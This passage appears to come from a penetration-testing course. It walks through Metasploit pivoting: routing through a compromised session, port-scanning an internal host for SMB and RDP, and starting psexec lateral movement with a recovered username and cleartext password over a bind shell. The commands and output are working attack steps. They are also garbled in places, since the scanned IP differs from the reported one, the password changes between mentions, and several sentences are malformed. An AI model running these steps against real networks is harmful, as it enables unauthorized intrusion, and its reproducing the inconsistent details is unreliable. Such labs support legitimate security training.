Listing 692 - Adding route to network 172.16.5.0/24 from session 2

With a path cleared to the internal network, we can enumerate this subnet. Now we could see the whole network for live hosts with a post scan auxiliary module. Since this scan would take some time to complete, let's shorten this step by scanning the other live host in the second network. Therefore, instead of setting the value of RHOSTS to 172.16.5.0/24 as we would want to scan the whole network, we set it to 172.16.5.20. For now, we only want to scan ports 445 and 3389.

```
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.20
RHOSTS = 172.16.5.20
```

```
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS = 445,3389
```

```
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 172.16.5.200 - 172.16.5.200:445 - TCP OPEN
[+] 172.16.5.200 - 172.16.5.200:3389 - TCP OPEN
[+] 172.16.5.200 - Scanned 1 of 1 hosts (100% completed)
[+] Auxiliary module executed an internal ip address
```

Listing 693 - Portscan of 172.16.5.200 ports 445 and 3389. Let's use two of SMB and RDP using our pivot host ITWK01 to perform operations on the target.

First, we attempt to use the psexec¹ to get access on the second target user as luiza. In the previous section, we retrieved the NTLM hash via Kiwi. Let's assume we could successfully capture the NTLM hash and the clear-text password is BocieDearAeroMeow1!. For psexec to work, luiza has a local administrator on the second machine. For this machine, let's assume that we have this information gathering techniques.

Let's use SMBUser exploit and set SMBUser to luiza, SMBPass to BocieDearAeroMeow1, and RHOSTS to 172.16.5.200.

It's important to note that the exploit will only work with established connections. Because of this, the new shell on the target must be a bind shell such as windows/x64/meterpreter/bind.tcp, allowing us to use the route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in situations where the target does not have a route for our network.

```
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
[+] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

```
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser = luiza
```
